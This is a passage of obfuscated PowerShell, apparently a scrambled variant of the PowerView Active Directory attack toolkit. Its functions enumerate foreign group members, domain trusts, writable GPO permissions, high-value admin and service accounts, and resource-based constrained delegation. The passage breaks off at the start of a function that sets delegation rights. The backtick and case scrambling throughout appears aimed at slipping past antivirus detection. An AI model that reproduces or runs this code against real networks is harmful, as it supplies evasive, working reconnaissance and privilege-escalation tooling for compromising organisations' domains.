                        ${FoR`EIgnu`sER} | ad`D-m`em`Ber Not`EPrO`pERTy 'UserName' ${_}.samaccountname
                        ${F`orEIg`N`UseR} | AdD`-`MEM`BEr nOT`epROPE`R`TY 'UserDistinguishedName' ${_}.distinguishedname
                        ${f`OR`e`igNuSER} | ADD-Mem`B`Er NotE`PR`OPeR`TY 'GroupDomain' ${GRoup`Do`MAin}
                        ${F`OrEIG`NUS`ER} | Add-`m`eMBEr n`OTEpROPE`R`Ty 'GroupName' ${gRoUP`Na`ME}
                        ${f`OrEIGNU`SEr} | Add`-Me`MBer n`OT`eProPE`RTy 'GroupDistinguishedName' ${Mem`B`eRshIp}
                        ${f`o`REiGnUsER}.PSObject.TypeNames.Insert(0, 'PowerView.ForeignUser')
                        ${FORE`Ig`N`USER}
                    }
                }
            }
        }
    }
}


function g`e`T-`doM`AInfOreIgngROuP`MEMBeR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignGroupMember')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${tr`UE}, ValueFromPipelineByPropertyName = ${t`Rue})]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        ${dOMa`iN},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${LDaPF`iLT`eR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`Ro`peRTi`eS},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${SEArcH`B`A`se},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${sE`Rv`er},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${S`EArC`H`sCopE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${res`UL`TPagEsI`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SErVeR`T`imE`Li`mIt},

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        ${SE`C`UrItYmA`SKS},

        [Switch]
        ${T`Om`BStoNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRe`d`ENTIAl} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${S`e`ARcHER`Arg`U`mEnTs} = @{}
        ${sear`cHErA`R`gUMe`Nts}['LDAPFilter'] = '(member=*)'
        if (${PS`B`ou`NdparA`M`eters}['Domain']) { ${sea`R`chErarguMEn`TS}['Domain'] = ${dO`mA`IN} }
        if (${pSBO`UN`dPaR`AmEtErs}['Properties']) { ${seARChE`R`ArGumE`Nts}['Properties'] = ${P`R`oPertIES} }
        if (${PSb`O`UNDpaRA`M`eterS}['SearchBase']) { ${s`EarC`HERARG`UM`En`TS}['SearchBase'] = ${se`A`R`chBaSE} }
        if (${pS`BOunDParA`M`eTERS}['Server']) { ${sEa`R`CHERArGuMe`NTS}['Server'] = ${s`E`RVEr} }
        if (${pSB`Ou`NDpArA`METE`RS}['SearchScope']) { ${sEaRC`HERA`R`Gu`meNTS}['SearchScope'] = ${s`eARChsc`o`pE} }
        if (${PS`B`o`UNDParameT`ERS}['ResultPageSize']) { ${S`E`A`RchErArGum`EN`TS}['ResultPageSize'] = ${ResULt`pag`E`s`iZE} }
        if (${PsbO`UNd`pAR`AMeT`ERS}['ServerTimeLimit']) { ${sEArc`h`eRArg`UmeN`TS}['ServerTimeLimit'] = ${s`eRVer`T`I`mELImIt} }
        if (${P`sBOUn`DPA`RAMEteRS}['SecurityMasks']) { ${S`EARcHE`R`AR`gUMEntS}['SecurityMasks'] = ${seC`U`RITyMa`Sks} }
        if (${pS`Bou`NDPara`m`Ete`RS}['Tombstone']) { ${Sea`RcHErARg`Um`ENts}['Tombstone'] = ${tom`B`sToNe} }
        if (${P`sBo`Un`dp`ArAM`EterS}['Credential']) { ${SeArC`hE`RARGuM`e`Nts}['Credential'] = ${c`R`eDe`NTiAl} }
        if (${P`S`BO`UNd`PArAMeT`erS}['Raw']) { ${s`eaRCheRa`RgumeN`Ts}['Raw'] = ${R`Aw} }
    }

    PROCESS {
        
        ${eXC`L`UDeG`RO`UPs} = @('Users', 'Domain Users', 'Guests')

        GET-`DoMA`ingRoUP @SearcherArguments | w`He`RE-O`BJEct { ${Exc`l`UdeGRO`U`PS} -notcontains ${_}.samaccountname } | F`Oreach`-o`Bj`ECt {
            ${Gr`Ou`pnamE} = ${_}.samAccountName
            ${gr`oUpd`i`STiNGuISHEDn`AME} = ${_}.distinguishedname
            ${GRo`U`pdOm`AIN} = ${Group`d`Isti`NguiS`HeDNaMe}.SubString(${Gro`UP`dIsTI`N`g`UishEDNaME}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'

            ${_}.member | FOrEa`C`h-oB`jEct {
                
                
                ${memb`ErDo`MA`in} = ${_}.SubString(${_}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                if ((${_} -match 'CN=S-1-5-21.*-.*') -or (${Gr`O`UpDOM`Ain} -ne ${me`M`Ber`doma`IN})) {
                    ${Me`mB`eR`dIStiNg`UisheD`NaME} = ${_}
                    ${M`Emb`Ern`AmE} = ${_}.Split(',')[0].split('=')[1]

                    ${F`OrEiG`Ng`ROuPmemBer} = NEW-O`B`JeCT P`Sobj`ect
                    ${FOrEigNg`R`ou`pMEMBeR} | Ad`D-MeM`BeR N`otEprOPE`R`Ty 'GroupDomain' ${GrO`U`p`dOMain}
                    ${fOreiG`NGR`OUpm`E`mB`eR} | Ad`d-meM`BEr note`prOp`e`RTy 'GroupName' ${gr`OuP`NAme}
                    ${FoREIgN`G`RoUpMe`MB`ER} | ad`d-`MeMbeR Not`eproP`eR`TY 'GroupDistinguishedName' ${grO`U`pDiSt`InguiSHe`D`N`AME}
                    ${fOr`e`igNgr`o`U`PmEmbER} | add-mE`M`BeR NO`Te`pROpERTY 'MemberDomain' ${MEM`BEr`do`M`AIn}
                    ${fO`ReIgng`Rou`PmeMB`eR} | add-`ME`mbeR nOT`EpR`oPERty 'MemberName' ${meM`B`eR`NAme}
                    ${fOr`E`iGnGroUpm`emB`er} | AdD-Me`M`BER n`OTEp`RO`peRty 'MemberDistinguishedName' ${M`embeRDIS`Ti`NGUishEDnA`mE}
                    ${foREIgnG`RouP`M`E`mbER}.PSObject.TypeNames.Insert(0, 'PowerView.ForeignGroupMember')
                    ${f`Or`EIGng`ROu`PMeMB`Er}
                }
            }
        }
    }
}


function GEt-`d`oM`A`iN`TRUstMAPpi`Ng {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        ${A`pI},

        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        ${N`Et},

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${LdapF`I`Lt`er},

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Prope`RT`IeS},

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${s`e`ARChB`AsE},

        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${S`Er`VeR},

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${se`A`Rchs`CopE} = 'Subtree',

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        ${RES`U`l`TPAgESIze} = 200,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        ${S`Erv`ertI`MEL`imIT},

        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        ${tom`Bst`oNe},

        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`Ede`NtIAl} = [Management.Automation.PSCredential]::Empty
    )

    
    ${SEeN`D`oMaIns} = @{}

    
    ${D`o`mAInS} = N`Ew-`OBject Sys`T`eM.col`LEC`T`IO`Ns.`stACk

    ${d`O`mAi`NtRus`T`ARgu`menTS} = @{}
    if (${PSB`O`UNDP`A`RamE`TeRS}['API']) { ${D`OMaIntru`stArG`U`mEnTS}['API'] = ${A`PI} }
    if (${P`SBouNDpAr`Am`Et`eRS}['NET']) { ${DoMa`InT`R`U`S`TarGuMentS}['NET'] = ${n`et} }
    if (${P`s`BOUNd`Pa`RamETERS}['LDAPFilter']) { ${dO`MAI`NtRuST`Ar`G`UmEntS}['LDAPFilter'] = ${LDaPfi`L`T`ER} }
    if (${psBOU`N`DPArA`M`etERs}['Properties']) { ${DomAi`N`TRUsTA`RGuME`N`Ts}['Properties'] = ${p`R`operTies} }
    if (${p`sBouN`d`Pa`RAm`eTErS}['SearchBase']) { ${do`mAin`T`R`USTaRgum`eN`TS}['SearchBase'] = ${se`AR`cHBase} }
    if (${pS`Bo`UN`dparA`MeteRS}['Server']) { ${D`O`m`A`InTrUs`TaRGUME`NtS}['Server'] = ${s`eR`Ver} }
    if (${psB`OUN`dPaRamEt`ers}['SearchScope']) { ${DOM`AiN`Tr`UStArg`UMENTs}['SearchScope'] = ${sEARC`H`sCoPe} }
    if (${p`s`Bou`NDpaRamEtErs}['ResultPageSize']) { ${DoMAI`N`TRUSTaR`GumEN`Ts}['ResultPageSize'] = ${re`SU`LTpAGeS`IZE} }
    if (${pS`BOUNdpA`R`AMETErs}['ServerTimeLimit']) { ${DO`mAintR`U`sta`RgUmenTs}['ServerTimeLimit'] = ${sERve`R`TimeL`iMit} }
    if (${Ps`BouNdPAR`AM`et`E`RS}['Tombstone']) { ${d`omaINtRU`stA`RG`UM`En`Ts}['Tombstone'] = ${t`oMb`StONe} }
    if (${P`sboUNdp`A`RA`m`eteRs}['Credential']) { ${DOm`AI`N`T`RustARGUm`ENtS}['Credential'] = ${C`RE`dEn`TIaL} }

    
    if (${P`sbOuNdp`ARa`M`E`TerS}['Credential']) {
        ${CU`R`R`ENTdo`maiN} = (gEt`-`domain -Credential ${c`R`E`dEnTIaL}).Name
    }
    else {
        ${c`URR`EN`Tdo`MaiN} = (gE`T-dO`MaiN).Name
    }
    ${DOm`A`iNs}.Push(${CurRenT`D`omAIN})

    while(${DOm`A`InS}.Count -ne 0) {

        ${d`OMA`iN} = ${doM`AinS}.Pop()

        
        if (${do`maiN} -and (${DOM`AIN}.Trim() -ne '') -and (-not ${sE`e`NDOmAI`Ns}.ContainsKey(${d`omAIN}))) {

            wRi`Te-VEr`BO`se "[Get-DomainTrustMapping] Enumerating trusts for domain: '$Domain'"

            
            ${nu`ll} = ${sEENDO`M`AInS}.Add(${d`omAiN}, '')

            try {
                
                ${dOmAI`N`T`RustArGUME`N`Ts}['Domain'] = ${do`Ma`in}
                ${trU`sts} = GET-d`o`m`AInT`RUSt @DomainTrustArguments

                if (${T`Rus`TS} -isnot [System.Array]) {
                    ${tRu`StS} = @(${tr`UsTS})
                }

                
                if (${p`sc`mdLET}.ParameterSetName -eq 'NET') {
                    ${fORes`Ttr`U`stArgU`MeNTS} = @{}
                    if (${Ps`B`O`UNDparamE`Ters}['Forest']) { ${fOrest`TRUStA`RG`UMents}['Forest'] = ${fo`ReST} }
                    if (${pS`BoUnDPa`R`AMETeRS}['Credential']) { ${fo`R`EsTTrU`S`Ta`RgUmen`TS}['Credential'] = ${cRE`den`TIal} }
                    ${trU`S`TS} += gET`-fo`R`esttruSt @ForestTrustArguments
                }

                if (${TR`UsTS}) {
                    if (${TR`USTs} -isnot [System.Array]) {
                        ${T`RUStS} = @(${t`Ru`sts})
                    }

                    
                    ForEach (${TR`Ust} in ${tR`U`Sts}) {
                        if (${Tru`ST}.SourceName -and ${tr`USt}.TargetName) {
                            
                            ${N`ULL} = ${DoM`Ai`Ns}.Push(${Tr`U`sT}.TargetName)
                            ${Tr`USt}
                        }
                    }
                }
            }
            catch {
                W`Rit`e-Ve`R`BOse "[Get-DomainTrustMapping] Error: $_"
            }
        }
    }
}


function geT-gPO`De`LegAt`ion {


    [CmdletBinding()]
    Param (
        [String]
        ${G`PONa`me} = '*',

        [ValidateRange(1,10000)] 
        [Int]
        ${page`S`Ize} = 200
    )

    ${e`xcl`UsiO`Ns} = @('SYSTEM','Domain Admins','Enterprise Admins')

    ${foRe`sT} = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    ${DOM`AiNLi`ST} = @(${F`OReST}.Domains)
    ${do`m`Ains} = ${DOMa`in`li`ST} | FoRe`ACh { ${_}.GetDirectoryEntry() }
    foreach (${dom`A`in} in ${d`o`maInS}) {
        ${Fil`TER} = "(&(objectCategory=groupPolicyContainer)(displayname=$GPOName))"
        ${sE`Arch`er} = NEW`-OB`JecT SYS`TE`m.Di`Re`Ct`OryseRviCEs`.`D`IrECTo`Ry`Se`ARCH`eR
        ${SE`A`RCHER}.SearchRoot = ${d`omA`iN}
        ${SEa`Rch`Er}.Filter = ${Fi`Lt`ER}
        ${sEArC`hER}.PageSize = ${paGE`S`i`zE}
        ${S`EaRChER}.SearchScope = "Subtree"
        ${li`sT`gPo} = ${sEArc`hER}.FindAll()
        foreach (${G`po} in ${Li`sT`gPo}){
            ${A`CL} = ([ADSI]${g`Po}.path).ObjectSecurity.Access | ? {${_}.ActiveDirectoryRights -match "Write" -and ${_}.AccessControlType -eq "Allow" -and  ${e`XcLU`S`ioNS} -notcontains ${_}.IdentityReference.toString().split("\")[1] -and ${_}.IdentityReference -ne "CREATOR OWNER"}
        if (${A`cl} -ne ${N`UlL}){
            ${g`P`OACl} = nEw-O`BJ`e`cT P`sOBJe`ct
            ${g`P`OacL} | aDD-`M`eMBer n`o`T`eProperty 'ADSPath' ${g`Po}.Properties.adspath
            ${gp`oA`CL} | aD`d-`mEmBeR NO`TEPrOPER`TY 'GPODisplayName' ${g`pO}.Properties.displayname
            ${g`pOAcL} | Add-m`eM`Ber N`ot`E`prOPERTy 'IdentityReference' ${a`CL}.IdentityReference
            ${Gp`oA`CL} | A`d`d-MEmbER NOT`epr`opERTY 'ActiveDirectoryRights' ${a`CL}.ActiveDirectoryRights
            ${Gpo`AcL}
        }
        }
    }
}

function find`-`HiGHvAlueA`C`C`oun`TS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ADObject')]
    [OutputType('PowerView.ADObject.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param (
        [Switch]
        ${s`pn},

        [Switch]
        ${en`A`BLeD},

        [Switch]
        ${dis`A`BLEd},

        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        ${aLl`ow`DeL`egatIoN},

        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        ${Dis`Allowd`elega`Tion},

        [Switch]
        ${PaS`s`NOt`EXP`irE},

        [Switch]
        ${uS`ERS},

        [Switch]
        ${coM`pu`TerS},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Do`mA`iN},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${SeR`Ver},

        [ValidateRange(1, 10000)]
        [Int]
        ${rES`Ul`T`pag`EsIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`erVeRtI`MelI`miT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`e`deNtIAl} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${R`AW}
    )

    BEGIN {
        ${seA`Rc`HerAr`GUmen`TS} = @{}
        if (${PSbou`NDPAra`ME`TE`Rs}['Domain']) { ${SEARche`RARG`Um`en`Ts}['Domain'] = ${do`MaiN} }
        if (${Ps`Bo`UnDPA`R`A`METErs}['Server']) { ${Se`ARc`he`RA`Rgume`NTS}['Server'] = ${se`RV`ER} }
        if (${psboUnDPa`RaM`E`TeRS}['ResultPageSize']) { ${sEa`Rc`he`RARgu`me`NTS}['ResultPageSize'] = ${R`eSuLTPA`GE`sIzE} }
        if (${PSB`OUndPA`RaMEt`ERs}['ServerTimeLimit']) { ${Se`A`RCHE`R`ARg`UMEnTs}['ServerTimeLimit'] = ${se`R`VE`RtiMeLi`miT} }
        if (${ps`Bou`NdpA`RAMEtERS}['Credential']) { ${Se`A`RCHeRar`gUM`e`Nts}['Credential'] = ${C`REdEn`TIal} }
        ${Ob`J`eCTs`E`ArCHeR} = gET-Do`Ma`Ins`EarcHer @SearcherArguments

        
        ${AdMI`N`g`RouPS} = @(
            'Account Operators',
            'Administrators',
            'Backup Operators',
            'Cert Publishers',
            'Domain Admins',
            'Enterprise Admins',
            'Enterprise Key Admins',
            'Key Admins',
            'Print Operators',
            'Replicator',
            'Schema Admins',
            'Server Operators'
        )

        
        ${iDENti`TYFIL`T`ER} = ''
        ${c`hecK} = @()
    }

    PROCESS {

        foreach (${aDMiN`gr`o`Up} in ${ad`mI`Ng`Roups}) {
            get-DOm`Ain`GrOupme`MB`er ${AdM`IN`Group} -Recurse @SearcherArguments | ?{${_}.MemberObjectClass -ne 'group'} | Fo`REAC`h-oBject {
                if (((!(${U`sers})) -And (!(${Co`MPu`TeRS}))) -Or (((${U`sE`RS}) -And (${_}.MemberObjectClass -eq 'user')) -Or ((${c`O`MPU`TErS}) -And (${_}.MemberObjectClass -eq 'computer')))) {
                    ${m`E`mBER`NaME} = ${_}.MemberName
                    if ((${mE`MBErN`A`mE}) -and ((${C`h`Eck}.Count -eq 0 ) -Or (!(${C`HeCK}.Contains(${m`EMb`ernAME}))))) {
                        ${Id`En`Tit`yfi`lTEr} += "(samaccountname=$MemberName)"
                        ${cH`eCk} += ${mE`m`BErNAME}
                    }
                }
            }
        }

        ${f`Ilt`Er} = "(|$IdentityFilter)"

        
        if (${p`sBOuN`D`PARa`mETERs}['SPN']) {
            w`R`I`TE-V`eRBoSE '[Find-HighValueAccounts] Searching for non-null service principal names'
            ${f`I`ltER} += '(servicePrincipalName=*)'
        }
        if (${p`SboUN`dparaMET`erS}['Enabled']) {
            wriTE-v`ERb`osE '[Find-HighValueAccounts] Searching for users who are enabled'
            
            ${FIlt`Er} += '(!(userAccountControl:1.2.840.113556.1.4.803:=2))'
        }
        if (${pS`Bou`ND`pARamet`erS}['Disabled']) {
            w`RI`TE`-VErb`oSe '[Find-HighValueAccounts] Searching for users who are disabled'
            
            ${FI`LT`Er} += '(userAccountControl:1.2.840.113556.1.4.803:=2)'
        }
        if (${PSBoU`N`dP`AraMETe`RS}['AllowDelegation']) {
            wrIt`E-VERb`OSE '[Find-HighValueAccounts] Searching for users who can be delegated'
            
            ${f`ilT`er} += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048576))'
        }
        if (${PS`BOUND`PaRAm`EtERs}['DisallowDelegation']) {
            W`RiTe-V`ERBO`SE '[Find-HighValueAccounts] Searching for users who are sensitive and not trusted for delegation'
            ${f`iLt`eR} += '(userAccountControl:1.2.840.113556.1.4.803:=1048576)'
        }
        if (${P`SbOU`NdpAR`AM`eTeRs}['PassNotExpire']) {
            WrI`Te`-veRb`o`Se '[Find-HighValueAccounts] Searching for users whose passwords never expire'
            ${fi`LteR} += '(userAccountControl:1.2.840.113556.1.4.803:=65536)'
        }

        ${o`BJECT`seaRcHER}.filter = "(&$Filter)"
        wRITE`-v`erbOSe "[Find-HighValueAccounts] Find-HighValueAccounts filter string: $($ObjectSearcher.filter)"
        ${re`SUL`TS} = ${O`B`jEcTs`EAR`cher}.FindAll()
        ${RE`s`ULTs} | WHeRE-`O`B`jEct {${_}} | fOREAcH-`Ob`je`ct {
            if (${psb`OUNdPArAM`e`TErS}['Raw']) {
                
                ${obJe`Ct} = ${_}
                ${O`BJect}.PSObject.TypeNames.Insert(0, 'PowerView.ADObject.Raw')
            }
            else {
                ${O`BjE`cT} = c`ONvERt`-`LDAP`PRopErTY -Properties ${_}.Properties
                ${o`BjE`CT}.PSObject.TypeNames.Insert(0, 'PowerView.ADObject')
            }
            ${OB`JEct}
        }
        if (${R`esUL`TS}) {
            try { ${reSUl`TS}.dispose() }
            catch {
                WritE`-`VeRbo`se "[Find-HighValueAccounts] Error disposing of the Results object: $_"
            }
        }
        ${oBJEct`Se`ARC`heR}.dispose()
    }
}

function ge`T-`dOmaiNRb`cd {

    [OutputType([PSObject])]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = ${Tr`Ue}, ValueFromPipelineByPropertyName = ${TR`UE})]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        ${ID`EN`Tity},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`O`MaIn},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${ld`APfilt`Er},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${propE`R`TIES},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${se`A`R`ChBASE},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${Ser`V`er},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${sEA`RchSc`O`Pe} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${Res`ULtpaGE`S`i`zE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seRve`RtIME`L`iMIt},

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        ${S`ec`UrItyMasKs},

        [Switch]
        ${TOmB`sT`ONe},

        [Alias('ReturnOne')]
        [Switch]
        ${F`iNDO`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`eDE`NTIAl} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${r`AW}
    )


    BEGIN {
        ${sEA`R`cHe`RaRGUMe`NTs} = @{}
        if (${pSBoU`N`Dp`ARa`METErs}['Domain']) { ${S`EArC`herAr`gu`MEN`Ts}['Domain'] = ${d`omAIn} }
        if (${p`Sb`ouNd`paRAm`et`ers}['Properties']) { ${S`eARC`HeRA`RGUm`e`NTs}['Properties'] = ${PRopE`RTi`es} }
        if (${p`sb`ouNDpARAME`Ters}['SearchBase']) { ${Se`A`RC`h`eraR`guMenTs}['SearchBase'] = ${Se`ArCH`Ba`Se} }
        if (${pS`BOuND`paR`AM`eTe`Rs}['Server']) { ${seAr`cHe`Ra`Rg`UMeNts}['Server'] = ${S`e`RvEr} }
        if (${p`S`BoU`NdpARAMEt`e`RS}['SearchScope']) { ${S`Ea`RcH`ERArgUMe`Nts}['SearchScope'] = ${s`EArc`hs`COpe} }
        if (${pSbo`U`NDPA`RA`M`eteRS}['ResultPageSize']) { ${Se`ARChEr`AR`guments}['ResultPageSize'] = ${REsU`L`TP`AGesi`Ze} }
        if (${pSboun`d`PAR`AM`et`ers}['ServerTimeLimit']) { ${sEar`cHe`R`ARg`UmENtS}['ServerTimeLimit'] = ${SE`RveRtImeL`i`mit} }
        if (${Psb`oUn`d`ParAMET`ERS}['SecurityMasks']) { ${seA`R`CHeRargU`M`ents}['SecurityMasks'] = ${Sec`URi`Ty`MA`sks} }
        if (${psb`ou`NDpA`R`Am`ETerS}['Tombstone']) { ${sE`ARCHERA`RGu`M`E`NtS}['Tombstone'] = ${tOM`Bs`ToNE} }
        if (${P`SBOUNd`ParaMe`TERS}['Credential']) { ${SEArc`hERa`RguM`e`NTs}['Credential'] = ${CRedeN`Ti`AL} }
        ${rb`CDs`eaR`ChEr} = Ge`T-doMainS`E`ARcHEr @SearcherArguments
    }

    PROCESS {
        
        if (${pSB`O`U`Nd`ParAMeterS} -and (${psb`OUn`DP`AraM`e`Ters}.Count -ne 0)) {
            nE`w-dyna`MiCPA`RA`M`eter -CreateVariables -BoundParameters ${psBo`U`Nd`pARamETERS}
        }
        if (${R`B`cdSEArcH`ER}) {
            ${id`E`N`Ti`TYFiLTer} = ''
            ${F`I`lTEr} = ''
            ${I`deNtI`TY} | g`e`T-`IDEntitYfilt`erSTr`ing | F`ORe`Ach-oBjECt {
                ${iD`EntI`TYFi`L`TER} += ${_}
            }
            if (${IDEntIT`Yfi`lteR} -and (${iDENt`iTyFilt`Er}.Trim() -ne '') ) {
                ${FiLt`ER} += "(|$IdentityFilter)"
            }

            ${f`I`lTEr} += '(msds-allowedtoactonbehalfofotheridentity=*)'

            if (${PSBo`U`NDp`ARaMETers}['LDAPFilter']) {
                wr`i`Te-verboSE "[Get-DomainRBCD] Using additional LDAP filter: $LDAPFilter"
                ${f`iLteR} += "$LDAPFilter"
            }
            if (${f`I`ltEr} -and ${filT`ER} -ne '') {
                ${r`BCDsEAr`C`HER}.filter = "(&$Filter)"
            }
            WRite`-Ve`Rb`ose "[Get-DomainRBCD] Get-DomainRBCD filter string: $($RBCDSearcher.filter)"

            if (${pSBouNDpA`Ra`me`TeRs}['FindOne']) { ${RE`SuL`Ts} = ${rbCDS`e`ARCHER}.FindOne() }
            else { ${r`es`ULTs} = ${Rb`cD`SEa`RCheR}.FindAll() }
            ${rE`Su`LTs} | w`H`ErE-`obJEct {${_}} | fOR`Eac`H-O`BJEct {
                if (${PsB`OUn`DP`Ar`AMeTERS}['Raw']) {
                    
                    ${ob`J`ect} = ${_}
                    ${Ob`j`ect}.PSObject.TypeNames.Insert(0, 'PowerView.ADObject.Raw')
                }
                else {
                    ${O`BjE`Ct} = CoNvERT`-`ldA`PpROperTY -Properties ${_}.Properties
                    ${ob`jecT}.PSObject.TypeNames.Insert(0, 'PowerView.ADObject')
                }

                ${R} = ${Ob`J`ecT} | S`e`Lect -expand mSDs-`ALlo`w`e`dtO`AC`TONBe`haLF`of`Othe`RiDenti`TY
                ${D} = N`EW`-obJECT S`ecURiTy`.aC`ceSScONt`Ro`L.`R`AwS`E`c`UrityDesCR`iptor -ArgumentList ${r}, 0
                ${D}.DiscretionaryAcl | F`oREac`H-O`BjeCT {
                    ${RbCd`oB`Je`ct} = N`EW`-OBJ`ECt psOb`j`eCt
                    ${r`BC`dobj`ecT} | a`dD`-MEmber "SourceName" ${o`BjEct}.samaccountname
                    ${rb`cdo`BJect} | adD-`M`eMbER "SourceType" ${obje`CT}.samaccounttype
                    ${R`BcdO`B`JECt} | adD-`me`MbER "SourceSID" ${obJE`Ct}.objectsid
                    ${RBC`D`O`BJECt} | adD`-mEMb`er "SourceAccountControl" ${o`BjEcT}.useraccountcontrol
                    ${RBCd`OBjE`Ct} | a`DD-M`EMBeR "SourceDistinguishedName" ${O`Bje`ct}.distinguishedname
                    ${rBc`D`o`BJect} | a`Dd-ME`MB`ER "ServicePrincipalName" ${oB`Je`cT}.serviceprincipalname

                    ${DelE`g`AtEd} = g`eT-`dOMAINObJ`ecT ${_}.SecurityIdentifier
                    ${rbCDO`B`jEcT} | AD`D-MeM`BeR "DelegatedName" ${DE`leGa`TeD}.samaccountname
                    ${R`BcD`o`BJEct} | A`Dd-`MeMbER "DelegatedType" ${D`ELEg`AteD}.samaccounttype
                    ${Rb`CDo`Bj`Ect} | Ad`d-mE`MbER "DelegatedSID" ${_}.SecurityIdentifier
                    ${rB`CD`Obj`ect} | a`d`d-membER "DelegatedAccountControl" ${DeleG`AT`Ed}.useraccountcontrol
                    ${Rbc`DobjE`Ct} | a`d`D-meMBeR "DelegatedDistinguishedName" ${DeleGA`T`Ed}.distinguishedname

                    ${rBc`D`Ob`ject}
                }
            }
            if (${R`E`SuLtS}) {
                try { ${rEs`Ul`TS}.dispose() }
                catch {
                    w`Ri`Te-Ve`RbOSe "[Get-DomainRBCD] Error disposing of the Results object: $_"
                }
            }
            ${R`B`cDsEArC`HeR}.dispose()
        }
    }
}

function SE`T-domAI`N`RBcd {

    [OutputType([bool])]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = ${t`Rue}, ValueFromPipelineByPropertyName = ${tr`UE})]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        ${I`D`enTITy},

        [String]
        ${Del`EgAt`EfROM},

        [Switch]
        ${c`lEAR},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Dom`A`iN},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${lD`APf`ILTer},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${proP`ert`IeS},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${sE`ArCh`B`Ase},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${s`er`VEr},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${sEARcHs`c`opE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${reSUlTP`Ag`e`si`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SERVErT`i`MeL`I`mIT},

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        ${SEC`URi`TY`maskS},

        [Switch]
        ${tOMbS`To`Ne},

        [Alias('ReturnOne')]
        [Switch]
        ${fi`NDone},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CREDe`NT`iAl} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${r`AW}
    )


    BEGIN {
